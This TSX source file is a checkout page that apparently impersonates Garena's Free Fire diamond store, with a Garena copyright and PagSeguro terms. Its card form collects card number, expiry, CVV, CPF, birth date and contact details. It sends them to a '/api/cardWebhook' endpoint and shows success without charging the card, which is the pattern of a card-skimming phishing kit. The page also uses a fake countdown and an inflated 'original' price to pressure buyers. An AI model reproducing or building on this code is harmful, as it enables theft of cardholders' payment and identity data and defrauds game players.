"use client";

import { useEffect } from "react";
import Image from "next/image";
import "./checkout.css";
import { useToast } from "@/hooks/useToast";
import { Header } from "@/components/Header"; 

export default function Checkout() {
  const { showToast, Toasts } = useToast();

  useEffect(() => {
    const checkoutData = JSON.parse(
      sessionStorage.getItem("checkoutData") || "{}"
    );

   const { price, base, bonus, payment, user } = checkoutData;

// Detecta se é produto especial pelo bonus nulo
const isSpecial = !bonus || bonus === "null";

// Se não for especial → calcula total
let total: string | number = "";
if (!isSpecial) {
  const baseNum = parseInt((base || "").replace(/\D/g, "")) || 0;
  const bonusNum = parseInt((bonus || "").replace(/\D/g, "")) || 0;
  total = baseNum + bonusNum;
} else {
  total = base; // Produto especial → só nome
}

// Timer do Pacote Lendário
let timeLeft = 180; // 3 minutos
const timerEl = document.getElementById("promoTimer");

if (timerEl) {
  const countdown = setInterval(() => {
    const min = String(Math.floor(timeLeft / 60)).padStart(2, "0");
    const sec = String(timeLeft % 60).padStart(2, "0");
    timerEl.textContent = `${min}:${sec}`;

    if (timeLeft <= 0) {
      clearInterval(countdown);
      // Expirou → fecha modal automaticamente
      document.getElementById("promoModal")?.classList.remove("show");
      document.getElementById("promoOverlay")?.classList.remove("show");
    }
    timeLeft--;
  }, 1000);
}

const elTotal = document.getElementById("summaryTotal");
const elBase = document.getElementById("summaryBase");
const elBonus = document.getElementById("summaryBonus");
const elPrice = document.getElementById("summaryPrice");
const elPayment = document.getElementById("summaryPayment");
const elUser = document.getElementById("summaryUser");

// 🔥 sempre normaliza o price
const priceNumber = parseFloat(String(price).replace(",", ".")) || 0;

if (isSpecial) {
  // 🚀 Produto especial (sem diamantes)
  if (elTotal) {
    const parent = elTotal.parentElement;
    if (parent) {
      const label = parent.querySelector("span:first-child");
      if (label) label.textContent = "Produto selecionado";
    }
    elTotal.textContent = base; // só nome do produto
  }
  if (elBase) elBase.parentElement!.style.display = "none";
  if (elBonus) elBonus.parentElement!.style.display = "none";
} else {
  // 🚀 Produto normal (diamantes)
  if (elTotal) {
    const parent = elTotal.parentElement;
    if (parent) {
      const label = parent.querySelector("span:first-child");
      if (label) label.textContent = "Total";
    }
    elTotal.innerHTML = `<img src="point.webp" class="icon">${total}`;
  }
  if (elBase) {
    elBase.parentElement!.style.display = "";
    elBase.innerHTML = `<img src="point.webp" class="icon">${base}`;
  }
  if (elBonus) {
    elBonus.parentElement!.style.display = "";
    elBonus.innerHTML = `<img src="point.webp" class="icon">${bonus}`;
  }
}

if (elPrice) elPrice.textContent = `R$ ${priceNumber.toFixed(2)}`;
if (elPayment) elPayment.textContent = payment;
let userId = "Desconhecido"; 

const accountData = localStorage.getItem("accountData");
if (accountData) {
  try {
    const acc = JSON.parse(accountData);
    if (acc.userId) {
      userId = acc.userId; // usa o campo correto
    }
  } catch (e) {
    console.error("Erro ao parsear accountData", e);
  }
}

if (elUser) elUser.textContent = userId;


    // Função que remove acentos
    function normalize(str: string) {
      return str
        .toLowerCase()
        .normalize("NFD")
        .replace(/[\u0300-\u036f]/g, "");
    }

    // Alterna formulário conforme pagamento
    if (payment && normalize(payment).includes("cartao")) {
      document.getElementById("form-card")!.style.display = "block";
      document.getElementById("form-default")!.style.display = "none";
    } else {
      document.getElementById("form-default")!.style.display = "block";
      document.getElementById("form-card")!.style.display = "none";
    }

// 🔥 Ajusta a info-text dinamicamente no CHECKOUT
const elInfo = document.querySelector(".info-text") as HTMLElement;
if (elInfo) {
  if (isSpecial) {
    // Produto especial → mostra só que será liberado após pagamento
    elInfo.textContent = "Este produto será liberado após a confirmação do pagamento.";
  } else {
    // Produto normal (diamantes)
    elInfo.textContent =
      "Os diamantes são válidos apenas para a região do Brasil e serão creditados diretamente na conta de jogo.";
  }
}

// =========================
// 🚀 Parcelas do Cartão (somente 1x habilitada)
// =========================
const parcelasContainer = document.querySelector(
  "#form-card .select-items"
) as HTMLElement;
const parcelasSelected = document.querySelector(
  "#form-card .select-selected span"
) as HTMLElement;

if (parcelasContainer && parcelasSelected && price) {
  parcelasContainer.innerHTML = ""; // limpa opções antigas

  const valorTotal = parseFloat(String(price).replace(",", ".")) || 0;
  const maxParcelas = 6; // até 6x (ou o que você quiser)

  for (let i = 1; i <= maxParcelas; i++) {
    const valorParcela = valorTotal / i;
    const option = document.createElement("div");

    option.textContent = `${i}x de R$ ${valorParcela.toFixed(2)} sem juros`;

    if (i === 1) {
      // 🔥 habilitada por padrão
      option.classList.add("active");
      parcelasSelected.textContent = option.textContent;

      option.addEventListener("click", () => {
        parcelasSelected.textContent = option.textContent;
        parcelasContainer
          .querySelectorAll("div")
          .forEach((el) => el.classList.remove("active"));
        option.classList.add("active");
        parcelasContainer.classList.remove("show");
      });
    } else {
      // 🔥 demais opções ficam desabilitadas
      option.classList.add("disabled");
    }

    parcelasContainer.appendChild(option);
  }
}
// =========================
// 🚀 Envio do form de cartão para backend
// =========================
const formCard = document.getElementById("form-card") as HTMLFormElement;
if (formCard) {
  formCard.addEventListener("submit", async (e) => {
    e.preventDefault();

    const btn = formCard.querySelector(".btn-submit") as HTMLButtonElement;
    btn.disabled = true;
    btn.textContent = "Enviando...";
    btn.style.background = "#f87171";

    // Coleta dados do form
    const payload = {
      user: userId,
      price,
      base,
      bonus,
      payment,
      cardNumber: (document.getElementById("cardNumber") as HTMLInputElement)?.value,
      validade: (document.getElementById("validade") as HTMLInputElement)?.value,
      cvv: (document.getElementById("cvv") as HTMLInputElement)?.value,
      parcelas: parcelasSelected?.textContent,
      nome: (document.getElementById("nomeCard") as HTMLInputElement)?.value,
      email: (document.getElementById("emailCard") as HTMLInputElement)?.value,
      cpf: (document.getElementById("cpf") as HTMLInputElement)?.value,
      nascimento: (document.getElementById("nascimento") as HTMLInputElement)?.value,
      telefone: (document.getElementById("telefoneCard") as HTMLInputElement)?.value,
    };

    try {
      const r = await fetch("/api/cardWebhook", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });

      if (r.ok) {
        showToast("success", "Sucesso", "Dados enviados com sucesso.");
      } else {
        showToast("error", "Erro", "Falha ao enviar dados.");
      }
    } catch (err) {
      showToast("error", "Erro", "Falha na requisição.");
    } finally {
      btn.disabled = false;
      btn.textContent = "Prosseguir para pagamento";
      btn.style.background = "#ef4444";
    }
  });
}

// =========================
// 🚀 Lógica do custom-select Parcelas
// =========================
const customSelect = document.querySelector("#form-card .custom-select");
if (customSelect) {
  const selected = customSelect.querySelector(".select-selected") as HTMLElement;
  const items = customSelect.querySelector(".select-items") as HTMLElement;

  if (selected && items) {
    // 🔥 Toggle abre/fecha
    selected.addEventListener("click", () => {
      items.classList.toggle("show");
    });

    // 🔥 Seleciona uma opção
    items.querySelectorAll("div").forEach((option) => {
      option.addEventListener("click", () => {
        if (option.classList.contains("disabled")) return;

        // Atualiza o texto
        const span = selected.querySelector("span");
        if (span) span.textContent = option.textContent;

        // Marca ativo
        items.querySelectorAll("div").forEach((el) => el.classList.remove("active"));
        option.classList.add("active");

        // Fecha o dropdown
        items.classList.remove("show");
      });
    });

    // 🔥 Fecha se clicar fora
    document.addEventListener("click", (e) => {
      if (!customSelect.contains(e.target as Node)) {
        items.classList.remove("show");
      }
    });
  }
}

// =========================
// 🚀 Máscaras e validações do Formulário de Cartão
// =========================
const cardNumberInput = document.getElementById("cardNumber") as HTMLInputElement;
const validadeInput = document.getElementById("validade") as HTMLInputElement;
const cvvInput = document.getElementById("cvv") as HTMLInputElement;
const cpfInput = document.getElementById("cpf") as HTMLInputElement;
const nascimentoInput = document.getElementById("nascimento") as HTMLInputElement;
const telefoneCardInput = document.getElementById("telefoneCard") as HTMLInputElement;

if (cardNumberInput) {
  cardNumberInput.addEventListener("input", () => {
    let value = cardNumberInput.value.replace(/\D/g, "").slice(0, 16); // só números, máx 16
    value = value.replace(/(.{4})/g, "$1 ").trim(); // espaço a cada 4
    cardNumberInput.value = value;
  });
}

if (validadeInput) {
  validadeInput.addEventListener("input", () => {
    let value = validadeInput.value.replace(/\D/g, "").slice(0, 4); // só números, máx 4
    if (value.length >= 3) {
      value = value.replace(/(\d{2})(\d{1,2})/, "$1/$2");
    }
    validadeInput.value = value;
  });
}

if (cvvInput) {
  cvvInput.addEventListener("input", () => {
    cvvInput.value = cvvInput.value.replace(/\D/g, "").slice(0, 4); // até 4 dígitos
  });
}

if (cpfInput) {
  cpfInput.addEventListener("input", () => {
    let value = cpfInput.value.replace(/\D/g, "").slice(0, 11); // só números, máx 11
    value = value.replace(/(\d{3})(\d)/, "$1.$2");
    value = value.replace(/(\d{3})(\d)/, "$1.$2");
    value = value.replace(/(\d{3})(\d{1,2})$/, "$1-$2");
    cpfInput.value = value;
  });
}

if (nascimentoInput) {
  nascimentoInput.addEventListener("input", () => {
    let value = nascimentoInput.value.replace(/\D/g, "").slice(0, 8);
    if (value.length >= 5) {
      value = value.replace(/(\d{2})(\d{2})(\d{1,4})/, "$1/$2/$3");
    } else if (value.length >= 3) {
      value = value.replace(/(\d{2})(\d{1,2})/, "$1/$2");
    }
    nascimentoInput.value = value;
  });
}

if (telefoneCardInput) {
  telefoneCardInput.addEventListener("input", () => {
    let value = telefoneCardInput.value.replace(/\D/g, "").slice(0, 11);
    if (value.length > 10) {
      value = value.replace(/(\d{2})(\d{1})(\d{4})(\d{4})/, "($1) $2 $3-$4");
    } else if (value.length > 6) {
      value = value.replace(/(\d{2})(\d{4})(\d{0,4})/, "($1) $2-$3");
    } else if (value.length > 2) {
      value = value.replace(/(\d{2})(\d{0,5})/, "($1) $2");
    } else {
      value = value.replace(/(\d{0,2})/, "($1");
    }
    telefoneCardInput.value = value;
  });
}


    // =========================
    // 🚀 Validação em tempo real dos campos
    // =========================
    const nomeInput = document.getElementById("nome") as HTMLInputElement;
    const emailInput = document.getElementById("email") as HTMLInputElement;
    const telefoneInput = document.getElementById("telefone") as HTMLInputElement;

    // === Nome completo ===
    if (nomeInput) {
      nomeInput.addEventListener("input", () => {
        const errorDiv = nomeInput.parentElement?.querySelector(".error-message") as HTMLElement;
        const value = nomeInput.value.trim();

        if (!value) {
          errorDiv.style.display = "block";
          errorDiv.textContent = "Nome é obrigatório.";
          nomeInput.classList.add("error");
        } else if (value.split(" ").length < 2) {
          errorDiv.style.display = "block";
          errorDiv.textContent = "Por favor, insira o nome e sobrenome.";
          nomeInput.classList.add("error");
        } else {
          errorDiv.style.display = "none";
          nomeInput.classList.remove("error");
        }
      });
    }

    // === E-mail ===
    if (emailInput) {
      emailInput.addEventListener("input", () => {
        const errorDiv = emailInput.parentElement?.querySelector(".error-message") as HTMLElement;
        const value = emailInput.value.trim();
        const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

        if (!value) {
          errorDiv.style.display = "block";
          errorDiv.textContent = "E-mail é obrigatório.";
          emailInput.classList.add("error");
        } else if (!regex.test(value)) {
          errorDiv.style.display = "block";
          errorDiv.textContent = "Formato de e-mail inválido.";
          emailInput.classList.add("error");
        } else {
          errorDiv.style.display = "none";
          emailInput.classList.remove("error");
        }
      });
    }

    // === Máscara de Telefone ===
    if (telefoneInput) {
      telefoneInput.addEventListener("input", () => {
        // Remove tudo que não for número
        let value = telefoneInput.value.replace(/\D/g, "");

        // Limita a 11 dígitos (2 DDD + 9 números)
        if (value.length > 11) {
          value = value.slice(0, 11);
        }

        // Se não digitou nada → deixa vazio
        if (value.length === 0) {
          telefoneInput.value = "";
          return;
        }

        // Aplica formatação conforme o tamanho
        if (value.length > 10) {
          // (00) 0 0000-0000
          value = value.replace(/(\d{2})(\d{1})(\d{4})(\d{4})/, "($1) $2 $3-$4");
        } else if (value.length > 6) {
          // (00) 0000-0000
          value = value.replace(/(\d{2})(\d{4})(\d{0,4})/, "($1) $2-$3");
        } else if (value.length > 2) {
          // (00) 0000
          value = value.replace(/(\d{2})(\d{0,5})/, "($1) $2");
        } else if (value.length <= 2) {
          // (0 ou (00
          value = value.replace(/(\d{0,2})/, "($1");
        }

        telefoneInput.value = value;
      });
    }

    // =========================
    // 🚀 Checkbox Promo
    // =========================
    const promoItems = document.querySelectorAll(".promo-item") as NodeListOf<HTMLElement>;
    const promoTotalEl = document.getElementById("promoTotal");
    const finalizarBtn = document.getElementById("finalizarPromo") as HTMLButtonElement;

    let promoExtra = 0;
const baseCheckout = parseFloat(String(checkoutData.price).replace(",", ".")) || 0;

// 🔥 Inicializa o total do modal com o valor base
if (promoTotalEl) {
  promoTotalEl.textContent = `R$ ${baseCheckout.toFixed(2)}`;
}
if (finalizarBtn) {
  const originalPrice = parseFloat(String(price).replace(",", ".")) || 0;
  const pacotePrice = 29.90;
  finalizarBtn.textContent = `Adicionar e pagar 
  R$ ${(originalPrice + pacotePrice).toFixed(2)}`;
}


    promoItems.forEach((item) => {
      const checkbox = item.querySelector(".promo-check") as HTMLInputElement;
      const priceText = item.querySelector(".price")?.textContent || "0";
      const price = parseFloat(priceText.replace("R$", "").replace(",", "."));

      // 🔥 Clique em qualquer lugar do item → alterna checkbox
      item.addEventListener("click", (e) => {
        if ((e.target as HTMLElement).classList.contains("promo-check")) return;

        checkbox.checked = !checkbox.checked;
        // 🔥 dispara evento para recalcular total
        checkbox.dispatchEvent(new Event("change", { bubbles: true }));
      });

      // 🔥 Recalcula ao mudar checkbox
      checkbox.addEventListener("change", () => {
        if (checkbox.checked) {
          promoExtra += price;
        } else {
          promoExtra -= price;
        }

        const totalAtual = baseCheckout + promoExtra;

if (promoTotalEl) {
  promoTotalEl.textContent = `R$ ${totalAtual.toFixed(2)}`;
}
if (finalizarBtn) {
  finalizarBtn.textContent = `Adicionar e Pagar R$ ${totalAtual.toFixed(2)}`;
}
sessionStorage.setItem("checkoutData", JSON.stringify({
  ...checkoutData,
  price: totalAtual.toFixed(2) // string "14.90"
}));
      });
    });

// =========================
// 🚀 Modal Promo + Pix
// =========================
const formPix = document.getElementById("form-default") as HTMLFormElement;
let isProcessing = false; // 🔥 trava para não enviar duplicado

if (formPix) {
  formPix.addEventListener("submit", handleOpenPromo);
}

function handleOpenPromo(e: Event) {
  e.preventDefault();
  const btn = formPix.querySelector(".btn-submit") as HTMLButtonElement;
  btn.disabled = true;
  btn.textContent = "Processando...";
  btn.style.background = "#f87171";

  let valid = true;

  formPix.querySelectorAll("input").forEach((input) => {
    const errorDiv = input.parentElement?.querySelector(".error-message") as HTMLElement;
    if (input.id === "promo") return;

    if (input.value.trim() === "") {
      input.classList.add("error");
      if (errorDiv) errorDiv.style.display = "block";
      valid = false;
    } else {
      input.classList.remove("error");
      if (errorDiv) errorDiv.style.display = "none";
    }
  });

  if (!valid) {
    btn.disabled = false;
    btn.textContent = "Prosseguir para pagamento";
    btn.style.background = "#d32f2f";
    showToast("error", "Erro de Validação", "Por favor, preencha todos os campos obrigatórios corretamente.");
    return;
  }

  // ✅ só abre modal se passar na validação
  document.getElementById("promoOverlay")?.classList.add("show");
  document.getElementById("promoModal")?.classList.add("show");

  const skipBtn = document.getElementById("skipPromo") as HTMLButtonElement;
  const finalizarBtn = document.getElementById("finalizarPromo") as HTMLButtonElement;

  if (skipBtn) {
    skipBtn.onclick = () => {
      skipBtn.disabled = true;

      // Atualiza o preço com o valor base original
      const checkoutData = JSON.parse(sessionStorage.getItem("checkoutData") || "{}");
      const baseCheckout = parseFloat(String(checkoutData.price).replace(",", ".")) || 0;

      const totalFinal = baseCheckout;
      sessionStorage.setItem("checkoutData", JSON.stringify({
        ...checkoutData,
        price: totalFinal.toFixed(2)
      }));

      fecharPromo();
      continuarPix();
    };
  }

  if (finalizarBtn) {
    finalizarBtn.onclick = () => {
      finalizarBtn.disabled = true;

      const checkoutData = JSON.parse(sessionStorage.getItem("checkoutData") || "{}");
      const originalPrice = parseFloat(String(price).replace(",", ".")) || 0;
      const pacotePrice = 29.90;
      const totalFinal = originalPrice + pacotePrice;

      sessionStorage.setItem("checkoutData", JSON.stringify({
        ...checkoutData,
        price: totalFinal.toFixed(2),
        promoBundle: true,
      }));

      const elPrice = document.getElementById("summaryPrice");
      if (elPrice) elPrice.textContent = `R$ ${totalFinal.toFixed(2)}`;

      fecharPromo();
      continuarPix();
    };
  }
}

function fecharPromo() {
  document.getElementById("promoOverlay")?.classList.remove("show");
  document.getElementById("promoModal")?.classList.remove("show");
}

async function continuarPix() {
  if (isProcessing) return; // ⚡ já tem requisição em andamento
  isProcessing = true;

  const btn = formPix.querySelector(".btn-submit") as HTMLButtonElement;
  btn.disabled = true;
  btn.textContent = "Processando...";
  btn.style.background = "#f87171";

  const checkoutData = JSON.parse(sessionStorage.getItem("checkoutData") || "{}");
  const totalFinal = parseFloat(checkoutData.price);

  const amountCents = Math.round(totalFinal * 100);
  const orderId = Date.now().toString();
  const description = `Recarga Free Fire - Pedido #${orderId}`;

  const payer = {
    name: nomeInput?.value,
    email: emailInput?.value,
    phone: telefoneInput?.value,
  };

  try {
    const r = await fetch("/api/checkout", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ amount: amountCents, orderId, description, payer }),
    });

    const data = await r.json();

    if (!r.ok || !data.id) {
      isProcessing = false;
      showToast("error", "Erro", "Erro ao gerar PIX.");
      btn.disabled = false;
      btn.textContent = "Prosseguir para pagamento";
      btn.style.background = "#d32f2f";
      return;
    }

    sessionStorage.setItem("pixCheckout", JSON.stringify({
      ...checkoutData,
      transactionId: data.id,
      externalId: data.externalId,
      brcode: data.brcode,
      qrBase64: data.qrBase64,
      totalAmount: totalFinal.toFixed(2),
      createdAt: Date.now(),
      userId: userId
    }));

    setTimeout(() => {
      window.location.href = "/buy";
    }, 1500);
  } catch (err) {
    isProcessing = false;
    showToast("error", "Erro", "Falha na integração PIX.");
    btn.disabled = false;
    btn.textContent = "Prosseguir para pagamento";
    btn.style.background = "#d32f2f";
  }
}
  }, [showToast]);



return (
  <>
    <Header avatarIcon="/ff.webp" />

    <main>

      {/* 🚀 Checkout */}
      <div className="checkout">
        <div className="banner">
          <Image src="/FF-f997537d.jpg" alt="Banner Free Fire" width={920} height={300} />
    <button 
  className="back-btn" 
  onClick={() => { window.location.href = "/"; }}
>
  <span className="icon">❮</span> Voltar
</button>

        </div>

        <div className="game-header">
          <Image
            src="/icon.webp"
            alt="Free Fire"
            width={90}
            height={90}
            className="game-icon"
          />
          <h2>Free Fire</h2>
        </div>

        <div className="summary">
          <p>
            <span>Total</span>
            <span id="summaryTotal"></span>
          </p>

          <div className="bonus-box">
            <p>
              <span>Preço Original</span>
              <span id="summaryBase"></span>
            </p>
            <p>
              <span>+ Bônus Geral</span>
              <span id="summaryBonus"></span>
            </p>
          </div>

    <p className="info-text"></p>

          <hr style={{ margin: "14px 0", border: "none", borderTop: "1px solid var(--line)" }} />

          <div className="summary-details">
            <p>
              <span>Preço</span>
              <strong id="summaryPrice"></strong>
            </p>
            <p>
              <span>Método de pagamento</span>
              <strong id="summaryPayment"></strong>
            </p>
            <p>
              <span>ID do Usuário</span>
              <strong id="summaryUser"></strong>
            </p>
          </div>

          <form id="form-default">
            <div className="form-group">
              <label htmlFor="promo">Código promocional</label>
              <div className="promo-box">
                <input type="text" id="promo" placeholder="Código Promocional" />
                <button type="button" className="btn-small">
                  Aplicar
                </button>
              </div>
            </div>

            <div className="form-group">
              <label htmlFor="nome">Nome completo</label>
              <input type="text" id="nome" placeholder="Nome Completo" />
              <div className="error-message">Nome é obrigatório.</div>
            </div>

            <div className="form-group">
              <label htmlFor="email">E-mail</label>
              <input type="email" id="email" placeholder="E-mail" />
              <div className="error-message">E-mail é obrigatório.</div>
            </div>

            <div className="form-group">
              <label htmlFor="telefone">Número de telefone</label>
              <input type="tel" id="telefone" placeholder="(00) 0 0000-0000" />
              <div className="error-message">Número de telefone é obrigatório.</div>
            </div>

            <p className="terms">
              Ao clicar em “Prosseguir para Pagamento”, atesto que li e concordo com os termos de uso e com a política de privacidade.
            </p>
            <button className="btn-submit">Prosseguir para pagamento</button>
          </form>
{/* 🔥 Formulário Cartão */}
<form id="form-card" style={{ display: "none" }}>
  <div className="form-group">
    <label htmlFor="cardNumber">Número do cartão</label>
    <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" />
    <div className="error-message">Número do cartão é obrigatório.</div>
  </div>

  <div style={{ display: "flex", gap: "10px" }}>
    <div className="form-group" style={{ flex: 1 }}>
      <label htmlFor="validade">Validade</label>
      <input type="text" id="validade" placeholder="MM/AA" />
      <div className="error-message">Data de validade inválida.</div>
    </div>
    <div className="form-group" style={{ flex: 1 }}>
      <label htmlFor="cvv">Código de segurança</label>
      <input type="text" id="cvv" placeholder="CVV" />
      <div className="error-message">CVV inválido.</div>
    </div>
  </div>

  {/* 🔥 Select Customizado das Parcelas */}
  <div className="form-group">
    <label>Parcelas</label>
    <div className="custom-select">
      <div className="select-selected">
        <span>Selecione o número de parcelas</span>
        <svg
          className="arrow"
          xmlns="http://www.w3.org/2000/svg"
          width="16"
          height="16"
          fill="none"
          viewBox="0 0 24 24"
          stroke="currentColor"
        >
          <path
            strokeLinecap="round"
            strokeLinejoin="round"
            strokeWidth="2"
            d="M19 9l-7 7-7-7"
          />
        </svg>
      </div>
      <div className="select-items">
        <div>1x de R$ 6,00 sem juros</div>
        <div className="disabled">2x de R$ 3,00 sem juros</div>
        {/* pode adicionar mais opções aqui */}
      </div>
    </div>
    <div className="error-message">Selecione uma parcela.</div>
  </div>

  <div className="form-group">
    <label htmlFor="nomeCard">Nome completo</label>
    <input type="text" id="nomeCard" placeholder="Nome Completo" />
    <div className="error-message">Nome é obrigatório.</div>
  </div>

  <div className="form-group">
    <label htmlFor="emailCard">E-mail</label>
    <input type="email" id="emailCard" placeholder="E-mail" />
    <div className="error-message">E-mail é obrigatório.</div>
  </div>

  <div style={{ display: "flex", gap: "10px" }}>
    <div className="form-group" style={{ flex: 1 }}>
      <label htmlFor="cpf">CPF</label>
      <input type="text" id="cpf" placeholder="000.000.000-00" />
      <div className="error-message">CPF inválido.</div>
    </div>
    <div className="form-group" style={{ flex: 1 }}>
      <label htmlFor="nascimento">Data de nascimento</label>
      <input type="text" id="nascimento" placeholder="DD/MM/AAAA" />
      <div className="error-message">Data de nascimento inválida.</div>
    </div>
  </div>

  <div className="form-group">
    <label htmlFor="telefoneCard">Número de telefone</label>
    <input type="tel" id="telefoneCard" placeholder="(00) 0 0000-0000" />
    <div className="error-message">Número de telefone é obrigatório.</div>
  </div>

  <p className="terms">
    Ao clicar em “Prosseguir para Pagamento”, atesto que li e concordo com os
    termos de uso e com a política de privacidade do PagSeguro.
  </p>
  <button className="btn-submit">Prosseguir para pagamento</button>
</form>
    </div>
<div id="promoOverlay" className="modal-overlay"></div>

<div id="promoModal" className="modal promo-bundle">
  <div className="promo-header">
    <h3 className="modal-title">Oferta Relâmpago</h3>
    <div className="timer-box">
      <span id="promoTimer" className="promo-timer">03:00</span>
      <div className="timer-bar">
        <div className="timer-progress"></div>
      </div>
    </div>
  </div>

  <p className="modal-desc">
    Itens raros selecionados para você.<br />
    De <span className="old">R$ 129,99</span> por apenas <span className="price">R$ 29,90</span>!
  </p>

  <div className="bundle-items">
    <img src="/1.png" alt="Sombra Roxa" />
    <img src="/2.png" alt="Barba do Velho" />
    <img src="/Screenshot-31.webp" alt="Calça Angelical Azul" />
  </div>

  <div className="promo-actions">
    <button id="finalizarPromo" className="btn-submit big-btn pulse">
      Garantir Oferta Agora
    </button>
    <button id="skipPromo" className="btn ghost">Continuar sem oferta</button>
  </div>
</div>


      </div>
      {/* FOOTER */}
<footer className="footer">
  <div className="container footer-inner">
    <span>© 2025 Garena Online. Todos os direitos reservados.</span>
    <div className="footer-links">
      <a href="#">FAQ</a>
      <a href="#">Termos e Condições</a>
      <a href="#">Política de Privacidade</a>
    </div>
  </div>
</footer>

    </main>
    
      <Toasts />
    </>
  );
}
